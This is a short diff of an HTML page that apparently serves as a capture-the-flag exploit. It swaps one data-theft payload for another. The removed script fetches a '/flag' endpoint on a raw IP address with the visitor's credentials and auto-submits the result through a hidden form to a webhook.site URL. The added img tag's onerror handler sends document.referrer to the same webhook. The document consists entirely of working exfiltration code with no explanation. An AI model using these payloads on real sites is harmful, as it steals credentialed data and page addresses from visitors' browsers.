@@ -2,23 +2,9 @@
 <html>
 <body>
 
-<form id="exfil" action="https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75" method="POST">
-    <textarea name="flag" id="flag" style="display:none;"></textarea>
-</form>
-
-<script>
-(async () => {
-  try {
-    const flag = await fetch("https://31.97.187.222:40111/flag", {credentials:"include"})
-      .then(r => r.text());
-    document.getElementById("flag").value = flag;
-  } catch(e) {
-    document.getElementById("flag").value = "fetch_failed: " + e;
-  }
-
-  document.getElementById("exfil").submit();
-})();
-</script>
+<img src="https://31.97.187.222:40111/flag" 
+     referrerpolicy="unsafe-url"
+     onerror="this.src='https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75?leak='+document.referrer">
 
 </body>
 </html>
